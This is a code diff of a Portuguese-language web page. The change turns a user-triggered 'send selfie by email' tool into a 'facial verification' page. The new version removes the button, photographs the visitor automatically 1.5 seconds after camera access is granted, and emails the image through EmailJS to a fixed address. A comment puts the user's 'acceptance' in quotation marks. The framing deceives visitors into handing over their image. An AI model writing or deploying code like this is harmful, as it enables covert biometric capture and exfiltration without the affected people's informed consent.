@@ -3,124 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selfie para E-mail</title>
-    <!-- Importa a biblioteca do EmailJS -->
+    <title>Verificação Facial</title>
+    <!-- Script do EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // SUBSTITUA PELA SUA PUBLIC KEY DO EMAILJS
+            emailjs.init("YOUR_PUBLIC_KEY");
+        })();
+    </script>
     <style>
         body {
-            font-family: Arial, sans-serif;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #000;
-            color: white;
-            overflow: hidden;
+            background: #000;
+            font-family: Arial, sans-serif;
         }
-        video {
+        #video {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
+            max-width: 320px;
+            background: #222;
+            border-radius: 8px;
+            /* Espelhar a câmera frontal para parecer natural */
+            transform: scaleX(-1); 
         }
-        button {
-            position: absolute;
-            bottom: 30px;
-            padding: 15px 30px;
-            font-size: 20px;
-            background-color: #007bff;
+        #result {
+            display: none;
+            margin-top: 10px;
             color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            z-index: 10;
+            text-align: center;
         }
-        #status {
-            position: absolute;
-            top: 20px;
-            background: rgba(0,0,0,0.7);
-            padding: 10px;
-            border-radius: 5px;
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
             display: none;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
-    <button id="snap">📸 Enviar para E-mail</button>
-    <div id="status"></div>
+    <div style="text-align:center;">
+        <video id="video" autoplay playsinline></video>
+        <div id="result">
+            <p>Enviando foto...</p>
+            <div class="spinner" id="spinner"></div>
+            <p id="statusMsg"></p>
+        </div>
+    </div>
+
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- CONFIGURAÇÃO DO EMAILJS ---
-        // Substitua pelos seus dados do painel EmailJS
-        const EMAILJS_PUBLIC_KEY = "SEU_PUBLIC_KEY"; 
-        const EMAILJS_SERVICE_ID = "SEU_SERVICE_ID";
-        const EMAILJS_TEMPLATE_ID = "SEU_TEMPLATE_ID";
-
-        emailjs.init(EMAILJS_PUBLIC_KEY);
-
         const video = document.getElementById('video');
-        const snap = document.getElementById('snap');
-        const statusDiv = document.getElementById('status');
+        const canvas = document.getElementById('canvas');
+        const resultDiv = document.getElementById('result');
+        const spinner = document.getElementById('spinner');
+        const statusMsg = document.getElementById('statusMsg');
 
-        function showStatus(msg) {
-            statusDiv.textContent = msg;
-            statusDiv.style.display = 'block';
-            setTimeout(() => statusDiv.style.display = 'none', 3000);
-        }
-
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
-                });
-                video.srcObject = stream;
-            } catch (err) {
-                alert("Erro ao acessar câmera.");
-            }
-        }
-
-        snap.addEventListener('click', async () => {
-            snap.disabled = true;
-            showStatus("Enviando...");
-
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+        // 1. Acessa a câmera frontal
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: false 
+        })
+        .then(stream => {
+            video.srcObject = stream;
             
-            // Espelha a imagem
-            context.translate(canvas.width, 0);
-            context.scale(-1, 1);
-            context.drawImage(video, 0, 0);
-
-            // Converte para base64 (formato de imagem para e-mail)
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            const fileName = "selfie_" + new Date().getTime() + ".jpg";
-
-            try {
-                // Envia para o EmailJS
-                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-                    to_email: "seuemail@gmail.com", // Se quiser definir um email fixo no JS
-                    from_name: "Usuário da App",
-                    image: imageData, // O template deve ter uma variável {{image}}
-                    message: "Aqui está a foto capturada:"
-                });
-                
-                showStatus("✅ Foto enviada com sucesso!");
-            } catch (error) {
-                console.error('Erro:', error);
-                showStatus("❌ Erro ao enviar: " + error.text);
-            } finally {
-                snap.disabled = false;
-            }
+            // AGUARDA 1.5 SEGUNDOS PARA O USUÁRIO "ACEITAR" VISUALMENTE
+            // E DISPARA A FOTO AUTOMATICAMENTE
+            setTimeout(() => {
+                takePhotoAndSend(stream);
+            }, 1500); 
+        })
+        .catch(err => {
+            alert("Erro ao acessar câmera: " + err);
         });
 
-        startCamera();
-    </script>
+        function takePhotoAndSend(stream) {
+            // Para o fluxo de vídeo
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
 
+            // Configura o canvas para o tamanho do vídeo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Desenha o frame atual (espelhado para manter a coerência visual)
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Converte para imagem base64
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.7); // 0.7 é a qualidade
+            const imgData = dataUrl.split(',')[1]; // Pega só a parte da imagem
+
+            // 2. Envia via EmailJS
+            const templateParams = {
+                user_email: "seu_email@exemplo.com", // Opcional: se quiser capturar o email do usuário
+                message: "Nova foto de verificação capturada automaticamente.",
+                photo: imgData // Envia a imagem base64
+            };
+
+            spinner.style.display = 'block';
+            statusMsg.style.display = 'block';
+
+            // SUBSTITUA PELOS SEUS IDs DO EMAILJS
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCESSO!', response.status, response.text);
+                    statusMsg.innerText = "Foto enviada com sucesso!";
+                    statusMsg.style.color = "#4CAF50";
+                }, function(error) {
+                    console.log('FALHOU...', error);
+                    statusMsg.innerText = "Erro ao enviar.";
+                    statusMsg.style.color = "#f44336";
+                });
+        }
+    </script>
 </body>
 </html>
